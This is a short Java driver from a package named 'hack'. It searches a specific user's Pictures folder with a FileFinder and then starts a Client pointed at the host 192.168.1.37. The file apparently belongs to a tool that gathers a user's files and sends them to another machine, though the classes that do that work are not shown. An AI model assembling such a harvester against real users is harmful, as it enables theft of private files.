package com.grobster.hack;

import java.nio.file.*;

public class ClientTestDrive {
	public static void main(String[] args) {
		Path startingPath = Paths.get("C:\\Users\\kquarles\\Pictures");
		FileFinder ff = new FileFinder(startingPath);
		ff.search();
		Client client = new Client();
		client.setHost("192.168.1.37");
		client.go();
	}
}